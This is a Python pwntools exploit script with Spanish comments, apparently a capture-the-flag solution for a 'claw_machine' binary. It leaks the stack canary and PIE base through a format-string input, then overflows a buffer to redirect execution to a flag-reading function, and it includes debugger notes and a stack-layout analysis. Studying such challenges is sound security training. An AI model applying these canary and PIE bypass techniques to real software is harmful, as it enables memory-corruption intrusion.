from pwn import *

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

# Leak PIE Base
# Se utiliza un ataque de format string para filtrar la dirección base del PIE (Position Independent Executable).
# Esto es necesario porque las direcciones de las funciones y variables globales se calculan en tiempo de ejecución en base a esta dirección.

# Bypass Stack Canary
# Se utiliza otro ataque de format string para filtrar el valor del canary en la pila.
# El canary es un valor aleatorio que se coloca en la pila para detectar desbordamientos de buffer que sobrescriben la pila.
# Si el canary se sobrescribe, el programa terminará inmediatamente.
# Filtrar el valor del canary nos permite sobrescribir la pila sin que el programa termine.

# Ret2Win
# Una vez que hemos filtrado la dirección base del PIE y el valor del canary, podemos construir un payload que sobrescribe la pila para cambiar el flujo de ejecución del programa.
# En este caso, queremos que el programa ejecute una función llamada "read_flag" que imprimirá la flag.
# El payload consistirá en relleno hasta llegar al canary, el valor del canary, más relleno hasta llegar al RIP (Instruction Pointer), y finalmente la dirección de la función "read_flag".


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './claw_machine'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
io.sendlineafter(b'>>', b'9')
io.sendlineafter(b'>>', b'y')

# Offset de la función read_flag. Se debe calcular el piebase
read_flag_offset = 0xb84

# Leak de la dirección 21 de la pila para obtener CANARY
# Leak de la dirección 23 de la pila (main+53) para calcular PIEBASE
io.sendlineafter(b':', '%21$p %23$p'.encode())
io.recvline()
result = io.recvline()
pattern = re.compile(b'Thank you for giving feedback (0x[0-9a-fA-F]+) (0x[0-9a-fA-F]+)')
match = pattern.search(result)

if match:
    canary = int(match.group(1), 16)
    leaked_addr = int(match.group(2), 16)
    info("Canary: %#x", canary)
    info("Leaked Address: %#x", leaked_addr)
else:
    info("Values not found")

# Cálculo del PIEBASE
# piebase = leaked_addr - address offset
elf.address = leaked_addr - 0x1552
info("Piebase: %#x", elf.address)

# Actualizar read_flag
read_flag = elf.address + read_flag_offset
info("read_flag address: %#x", read_flag)

# Canary offset
padding = 72

payload = flat(
    b'A' * padding,
    canary,
    b'A'*8,
    read_flag
)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()


# CANARY LEAK
# 1. Utilizar ddb-pwndbg
# 2. pwndbg> canary
#     00:0000│  0x7fffffffdd18 ◂— 0xe0e04dd6850b3c00
# 3. Encontrar la posición de la dirección donde se encuentra el valor del canary en la pila
#     pwndbg> x/100gx $rsp
#         0x7fffffffe3e0:	0x00007fffffffe400	0x0000555555401552
#         0x7fffffffe3f0:	0x00007fffffffe4e0	0xe0e04dd6850b3c00 <----- Se encuentra en la posición 21
#         0x7fffffffe400:	0x0000555555401570	0x00007ffff7a03c87
# 4. A través de format strings leakear la dirección 21 de la pila para obtener CANARY

# PIEBASE LEAK
# 1. Leakear una dirección a través de format string. Por ejemplo 0x555555401552
# 2. Obtención del PIEBASE
#     pwndbg> piebase 
#         Calculated VA from /home/r1pfr4n/Downloads/PWN/challenge/claw_machine = 0x555555400000
# 3. Obtención del offset
#     pwndbg> x 0x555555401552 (leaked_addr) - 0x555555400000 (piebase)
#         0x1552:	Cannot access memory at address 0x1552
# 4. Sabeindo el offset de la dirección --> piebase = leaked_addr - address offset
# 5. Una vez obtenido el PIEBASE, se puede obtener una dirección a través de un offset: read_flag = elf.address (PIEBASE) + read_flag_offset (read_flag offset function)

# Diseño del STACK
#                 undefined fb()
# undefined         AL:1           <RETURN>
# undefined8        Stack[-0x10]:8 canary  <------- Canary. Hasta el RIP hay 0x10 bytes = 16 bytes. El canary ocupa 8, por lo tanto, 8 bytes de padding           
# undefined8        Stack[-0x20]:8 local_20                                 
# undefined8        Stack[-0x28]:8 local_28                                
# undefined8        Stack[-0x30]:8 local_30 
# undefined8        Stack[-0x38]:8 local_38                                
# undefined8        Stack[-0x40]:8 local_40                                 
# undefined8        Stack[-0x48]:8 local_48                                
# undefined8        Stack[-0x50]:8 local_50                             
# undefined8        Stack[-0x58]:8 local_58 <----- Buffer vulnerable. Hasta el canary hay 0x48 bytes (0x58 - 0x10) = 72 bytes. 72 bytes de padding
# undefined1        Stack[-0x68]:1 local_68                            
# undefined8        Stack[-0x70]:8 local_70                            
# undefined8        Stack[-0x78]:8 enter_name  
# undefined1        Stack[-0x79]:1 local_79                             
# undefined2        Stack[-0x7b]:2 local_7b 
